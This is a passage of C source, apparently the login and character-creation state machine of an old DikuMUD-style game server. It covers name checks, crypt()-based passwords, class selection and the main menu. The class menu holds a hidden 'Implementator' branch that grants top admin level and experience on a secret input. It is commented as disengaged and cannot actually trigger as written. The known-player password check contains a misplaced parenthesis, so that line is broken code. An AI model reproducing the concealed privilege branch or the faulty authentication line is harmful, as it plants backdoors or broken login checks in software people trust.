					return;
				}


				/* Check if already playing */
				for(k=descriptor_list; k; k = k->next) {
					if ((k->character != d->character) && k->character) {
						if (k->original) {
							if (GET_NAME(k->original) &&
						    (str_cmp(GET_NAME(k->original), tmp_name) == 0))
							{
								SEND_TO_Q("Already playing, cannot connect\n\r", d);
								SEND_TO_Q("Name: ", d);
								return;
							}
						} else { /* No switch has been made */
							if (GET_NAME(k->character) &&
						    (str_cmp(GET_NAME(k->character), tmp_name) == 0))
							{
								SEND_TO_Q("Already playing, cannot connect\n\r", d);
								SEND_TO_Q("Name: ", d);
								return;
							}
						}
					}
				}


				if ((player_i = load_char(tmp_name, &tmp_store)) > -1)
				{
					store_to_char(&tmp_store, d->character);

					strcpy(d->pwd, tmp_store.pwd);
					d->pos = player_table[player_i].nr;

					SEND_TO_Q("Password: ", d);

				STATE(d) = CON_PWDNRM;
				}
				else
				{
					/* player unknown gotta make a new */
					CREATE(GET_NAME(d->character), char, 
					  strlen(tmp_name) + 1);
					strcpy(GET_NAME(d->character), 
					  CAP(tmp_name));

					sprintf(buf, "Did I get that right, %s (Y/N)? ",
				  	 tmp_name);

					SEND_TO_Q(buf, d);

					STATE(d) = CON_NMECNF;
				}
			}
		break;

		case CON_NMECNF:	/* wait for conf. of new name	*/
			/* skip whitespaces */
			for (; isspace(*arg); arg++);
			
			if (*arg == 'y' || *arg == 'Y')
			{
				SEND_TO_Q("New character.\n\r", d);

				sprintf(buf, 
				   "Give me a password for %s: ",
				   GET_NAME(d->character));
				
				SEND_TO_Q(buf, d);

				STATE(d) = CON_PWDGET;
			}
			else
			{
				if (*arg == 'n' || *arg == 'N') {
					SEND_TO_Q("Ok, what IS it, then? ", d);
					free(GET_NAME(d->character));
					STATE(d) = CON_NME;
				} else { /* Please do Y or N */
					SEND_TO_Q("Please type Yes or No? ", d);
				}
			}
		break;

		case CON_PWDNRM:	/* get pwd for known player	*/
			/* skip whitespaces */
			for (; isspace(*arg); arg++);
			if (!*arg)
			   close_socket(d);
			else
			{
				if (strncmp(crypt(arg, d->pwd), d->pwd), 10)
				{
					SEND_TO_Q("Wrong password.\n\r", d);
					SEND_TO_Q("Password: ", d);
					return;
				}

				for (tmp_ch = character_list; tmp_ch; tmp_ch = tmp_ch->next)
					if (!str_cmp(GET_NAME(d->character), GET_NAME(tmp_ch)) &&
						!tmp_ch->desc && !IS_NPC(tmp_ch))
					{
						SEND_TO_Q("Reconnecting.\n\r", d);
						free_char(d->character);
						tmp_ch->desc = d;
						d->character = tmp_ch;
						tmp_ch->specials.timer = 0;
						STATE(d) = CON_PLYNG;
						act("$n has reconnected.", TRUE, tmp_ch, 0, 0, TO_ROOM);
						sprintf(buf, "%s[%s] has reconnected.", GET_NAME(
							d->character), d->host);
						log(buf);
						return;
					}
					
					
				sprintf(buf, "%s[%s] has connected.", GET_NAME(d->character),
					d->host);
				log(buf);

				SEND_TO_Q(motd, d);
				SEND_TO_Q("\n\r\n*** PRESS RETURN: ", d);

				STATE(d) = CON_RMOTD;
			}
		break;

		case CON_PWDGET:	/* get pwd for new player	*/
			/* skip whitespaces */
			for (; isspace(*arg); arg++);

			if (!*arg || strlen(arg) > 10)
			{
				SEND_TO_Q("Illegal password.\n\r", d);
				SEND_TO_Q("Password: ", d);
				return;
			}

			strncpy(d->pwd, crypt(arg, d->character->player.name), 10);
			*(d->pwd + 10) = '\0';
			

			SEND_TO_Q("Please retype password: ", d);

			STATE(d) = CON_PWDCNF;
		break;

		case CON_PWDCNF:	/* get confirmation of new pwd	*/
			/* skip whitespaces */
			for (; isspace(*arg); arg++);

			if (strncmp(crypt(arg, d->pwd), d->pwd, 10))
			{
				SEND_TO_Q("Passwords don't match.\n\r", d);
				SEND_TO_Q("Retype password: ", d);
				STATE(d) = CON_PWDGET;
				return;
			}

			SEND_TO_Q("What is your sex (M/F) ? ", d);
			STATE(d) = CON_QSEX;
		break;

		case CON_QSEX:		/* query sex of new user	*/
			/* skip whitespaces */
			for (; isspace(*arg); arg++);
			switch (*arg)
			{
				case 'm':
				case 'M':
					/* sex MALE */
					d->character->player.sex = SEX_MALE;
				break;

				case 'f':
				case 'F':
					/* sex FEMALE */
					d->character->player.sex = SEX_FEMALE;
				break;

				default:
					SEND_TO_Q("That's not a sex..\n\r", d);
					SEND_TO_Q("What IS your sex? :", d);
					return;
				break;
			}

			SEND_TO_Q("\n\rSelect a class:\n\rCleric\n\rThief\n\rWarrior\n\rMagic-user", d);
			SEND_TO_Q("\n\rClass :", d);
			STATE(d) = CON_QCLASS;
		break;

		case CON_QCLASS : {
			/* skip whitespaces */
			for (; isspace(*arg); arg++);
			switch (*arg)
			{
				case 'm':
				case 'M': {
					GET_CLASS(d->character) = CLASS_MAGIC_USER;
					init_char(d->character);
					/* create an entry in the file */
					d->pos = create_entry(GET_NAME(d->character));
					save_char(d->character, NOWHERE);
					SEND_TO_Q(motd, d);
					SEND_TO_Q("\n\r\n*** PRESS RETURN: ", d);
					STATE(d) = CON_RMOTD;
				} break;
				case 'c':
				case 'C': {
					GET_CLASS(d->character) = CLASS_CLERIC;
					init_char(d->character);
					/* create an entry in the file */
					d->pos = create_entry(GET_NAME(d->character));
					save_char(d->character, NOWHERE);
					SEND_TO_Q(motd, d);
					SEND_TO_Q("\n\r\n*** PRESS RETURN: ", d);
					STATE(d) = CON_RMOTD;
				} break;
				case 'w':
				case 'W': {
					GET_CLASS(d->character) = CLASS_WARRIOR;
					init_char(d->character);
					/* create an entry in the file */
					d->pos = create_entry(GET_NAME(d->character));
					save_char(d->character, NOWHERE);
					SEND_TO_Q(motd, d);
					SEND_TO_Q("\n\r\n*** PRESS RETURN: ", d);
					STATE(d) = CON_RMOTD;
				} break;
				case 't':
				case 'T': {
					GET_CLASS(d->character) = CLASS_THIEF;
					init_char(d->character);
					/* create an entry in the file */
					d->pos = create_entry(GET_NAME(d->character));
					save_char(d->character, NOWHERE);
					SEND_TO_Q(motd, d);
					SEND_TO_Q("\n\r\n*** PRESS RETURN: ", d);
					STATE(d) = CON_RMOTD;
				} break;
				case 'i' :    /* this has been disengaged for security reasons */
				case 'I' : {
					if (!str_cmp(arg,"Disengaged")){
						GET_EXP(d->character) = 7000000;
						GET_LEVEL(d->character) = 24;
						GET_COND(d->character, 0) = -1;
						GET_COND(d->character, 1) = -1;
						GET_COND(d->character, 2) = -1;
						SEND_TO_Q("Implementator selected...\n\rClass :", d);
						STATE(d) = CON_QCLASS;
					} else {
						SEND_TO_Q("\n\rThat's not a class.\n\rClass:", d);
						STATE(d) = CON_QCLASS;
					}
				} break;
				default : {
					SEND_TO_Q("\n\rThat's not a class.\n\rClass:", d);
					STATE(d) = CON_QCLASS;
				} break;
				
			} /* End Switch */
			if (STATE(d) != CON_QCLASS) {
				sprintf(buf, "%s [%s] new player.", GET_NAME(d->character),
					d->host);
				log(buf);
			}
		} break;

		case CON_RMOTD:		/* read CR after printing motd	*/
			SEND_TO_Q(MENU, d);
			STATE(d) = CON_SLCT;
		break;

		case CON_SLCT:		/* get selection from main menu	*/
			/* skip whitespaces */
			for (; isspace(*arg); arg++);
			switch (*arg)
			{
				case '0':
					close_socket(d);
				break;

				case '1':
					reset_char(d->character);
					if (d->character->in_room != NOWHERE) {
						log("Loading chars equipment and transferring to room.");
						load_char_objs(d->character);
						save_char(d->character, NOWHERE);
					}
					send_to_char(WELC_MESSG, d->character);
					d->character->next = character_list;
					character_list = d->character;
					if (d->character->in_room == NOWHERE)
						char_to_room(d->character, real_room(3001));
					else {
						if (real_room(d->character->in_room) > -1)
							char_to_room(d->character, real_room(d->character->in_room));
						else
	            char_to_room(d->character, real_room(3001));
					}

					act("$n has entered the game.", TRUE, d->character, 0, 0, TO_ROOM);
					STATE(d) = CON_PLYNG;
					do_look(d->character, "",15);
					d->prompt_mode = 1;
				break;

				case '2':
					SEND_TO_Q("Enter a text you'd like others to see when they look at you.\n\r", d);
					SEND_TO_Q("Terminate with a '@'.\n\r", d);
					if (d->character->player.description)
					{
						SEND_TO_Q("Old description :\n\r", d);
						SEND_TO_Q(d->character->player.description, d);
						free(d->character->player.description);
						d->character->player.description = 0;
					}
					d->str = 
					   &d->character->player.description;
					d->max_str = 240;
					STATE(d) = CON_EXDSCR;
				break;

				case '3':
					SEND_TO_Q(STORY, d);
					STATE(d) = CON_RMOTD;
				break;
				case '4':
					SEND_TO_Q("Enter a new password: ", d);
					STATE(d) = CON_PWDNEW;
				break;
				default:
					SEND_TO_Q("Wrong option.\n\r", d);
					SEND_TO_Q(MENU, d);
				break;
			}
		break;
		case CON_PWDNEW:
			/* skip whitespaces */
			for (; isspace(*arg); arg++);

			if (!*arg || strlen(arg) > 10)
			{
				SEND_TO_Q("Illegal password.\n\r", d);
				SEND_TO_Q("Password: ", d);
				return;
			}

			strncpy(d->pwd, crypt(arg, d->character->player.name), 10);
			*(d->pwd + 10) = '\0';

			SEND_TO_Q("Please retype password: ", d);

			STATE(d) = CON_PWDNCNF;
		break;
		case CON_PWDNCNF:
			/* skip whitespaces */
			for (; isspace(*arg); arg++);

			if (strncmp(crypt(arg, d->pwd), d->pwd, 10))
			{
				SEND_TO_Q("Passwords don't match.\n\r", d);
				SEND_TO_Q("Retype password: ", d);
				STATE(d) = CON_PWDNEW;
				return;
			}
			SEND_TO_Q(
				"\n\rDone. You must enter the game to make the change final\n\r",
					d);
			SEND_TO_Q(MENU, d);
			STATE(d) = CON_SLCT;
		break;
		default:
			log("Nanny: illegal state of con'ness");
			abort();
		break;
	}
}
